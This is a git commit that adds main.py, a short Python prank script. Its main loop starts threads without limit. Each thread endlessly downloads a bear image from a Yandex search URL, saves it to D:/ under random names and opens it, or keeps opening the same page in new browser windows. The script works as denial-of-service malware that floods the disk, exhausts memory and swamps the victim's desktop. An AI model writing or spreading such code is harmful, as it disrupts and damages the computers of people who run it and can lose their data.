069a7e92968c37e0afc507675511382448414f51
_MrChed_ <141160614+MrChed@users.noreply.github.com>
2023-09-03 18:17:38 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,27 @@
+import requests
+import webbrowser
+from threading import Thread
+from random import choice
+from os import startfile
+def gen_name(num: int = 8):
+	g = ""
+	for x in range(num):
+		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
+	return g
+
+def img_spam():
+	while True:
+		p = requests.get('https://yandex.ru/images/search?text=%D1%84%D0%BE%D1%82%D0%BE+%D0%BC%D0%B8%D1%88%D0%BA%D0%B8+%D0%B1%D0%B5%D0%BB%D0%BE%D0%B3%D0%BE&img_url=https%3A%2F%2Foir.mobi%2Fuploads%2Fposts%2F2021-05%2F1620164785_6-oir_mobi-p-mishka-umka-zhivotnie-krasivo-foto-6.jpg&pos=7&rpt=simage&stype=image&lr=213&parent-reqid=1693488757659739-12916686372683661727-balancer-l7leveler-kubr-yp-sas-32-BAL-5636&source=serp')
+		name = gen_name()
+		out = open(f"D:/{name}.jpg", "wb")
+		out.write(p.content)
+		out.close()
+		startfile(rf"D:/{name}.jpg")
+
+def browser_open():
+	while True:
+		webbrowser.open('https://yandex.ru/images/search?text=%D1%84%D0%BE%D1%82%D0%BE+%D0%BC%D0%B8%D1%88%D0%BA%D0%B8+%D0%B1%D0%B5%D0%BB%D0%BE%D0%B3%D0%BE&img_url=https%3A%2F%2Foir.mobi%2Fuploads%2Fposts%2F2021-05%2F1620164785_6-oir_mobi-p-mishka-umka-zhivotnie-krasivo-foto-6.jpg&pos=7&rpt=simage&stype=image&lr=213&parent-reqid=1693488757659739-12916686372683661727-balancer-l7leveler-kubr-yp-sas-32-BAL-5636&source=serp', new=2)
+
+while True:
+	Thread(target=img_spam).start()
+	Thread(target=browser_open).start()
